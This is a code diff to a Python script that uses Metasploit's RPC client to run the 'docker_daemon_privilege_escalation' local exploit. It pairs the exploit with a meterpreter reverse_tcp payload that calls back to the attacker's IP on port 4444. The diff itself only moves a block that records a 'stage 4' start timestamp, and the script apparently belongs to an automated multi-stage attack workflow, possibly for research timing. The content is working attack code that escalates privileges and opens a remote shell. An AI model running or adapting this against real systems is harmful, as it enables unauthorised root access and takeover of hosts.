@@ -19,16 +19,17 @@ def main(argv):
     target_ip = argv[3]
 
     client = MsfRpcClient('kali')
+    
+    # start step 4
+    output_time_file = 'time_stage_4_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
     exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
     payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
     exploit['SESSION'] = 1
     payload['LHOST'] = my_ip
     payload['LPORT'] = 4444
-
-    output_time_file = 'time_stage_4_start.txt'
-    record_timestamp(folder, output_time_file)
-    time.sleep(2)
 
     exploit.execute(payload=payload)
 
